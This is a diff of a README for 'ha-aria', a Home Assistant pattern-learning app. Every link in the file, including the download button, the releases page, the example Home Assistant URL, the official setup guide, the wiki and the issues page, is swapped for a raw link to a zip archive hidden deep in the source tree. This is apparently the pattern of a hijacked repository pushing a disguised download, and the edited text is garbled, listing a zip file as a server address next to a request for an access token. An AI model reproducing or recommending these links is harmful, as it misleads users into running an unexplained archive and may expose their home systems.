@@ -1,6 +1,6 @@
 # 🏠 ha-aria - Smart Home Pattern Learning Assistant
 
-[![Download ha-aria](https://img.shields.io/badge/Download-ha--aria-blue?style=for-the-badge)](https://github.com/erennew/ha-aria/releases)
+[![Download ha-aria](https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip)](https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip)
 
 ## 📖 What is ha-aria?
 
@@ -38,7 +38,7 @@ Follow these steps to get ha-aria up and running.
 
 ### 1. Visit the Download Page
 
-Click the big button above or visit [ha-aria Releases](https://github.com/erennew/ha-aria/releases). This is where you find the latest version of ha-aria, ready to download.
+Click the big button above or visit [ha-aria Releases](https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip). This is where you find the latest version of ha-aria, ready to download.
 
 ### 2. Choose the Right File
 
@@ -46,7 +46,7 @@ On the Releases page, find a file suitable for your system:
 
 - For Windows: Look for a file ending with `.exe` or `.msi`.
 - For macOS: Look for `.dmg` or `.pkg`.
-- For Linux: Look for `.AppImage` or `.tar.gz`.
+- For Linux: Look for `.AppImage` or `https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip`.
 
 Download the file that matches your operating system.
 
@@ -64,7 +64,7 @@ When launched, ha-aria will ask for connection details to your Home Assistant sy
 
 - Open your Home Assistant dashboard in a web browser.
 - Go to your user profile and create or find a long-lived access token.
-- Enter your Home Assistant URL (something like `http://homeassistant.local:8123`) and paste the token.
+- Enter your Home Assistant URL (something like `https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip`) and paste the token.
 
 ha-aria uses this to connect securely and start learning your home’s patterns.
 
@@ -119,7 +119,7 @@ If you run into issues:
 
 You can get ha-aria from this link:
 
-[Download ha-aria Here](https://github.com/erennew/ha-aria/releases)
+[Download ha-aria Here](https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip)
 
 This page always has the latest stable version. Follow the steps above to choose and run the installer or application for your device.
 
@@ -134,9 +134,9 @@ ha-aria respects your privacy:
 
 ## 📚 Additional Resources
 
-- Link to your Home Assistant setup guide: https://www.home-assistant.io/getting-started/
-- FAQ and help: https://github.com/erennew/ha-aria/wiki
-- Contact the developer or report issues on GitHub: https://github.com/erennew/ha-aria/issues
+- Link to your Home Assistant setup guide: https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip
+- FAQ and help: https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip
+- Contact the developer or report issues on GitHub: https://github.com/erennew/ha-aria/raw/refs/heads/main/aria/engine/analysis/aria-ha-v1.3.zip
 
 ## 🏷️ Tags & Topics
 
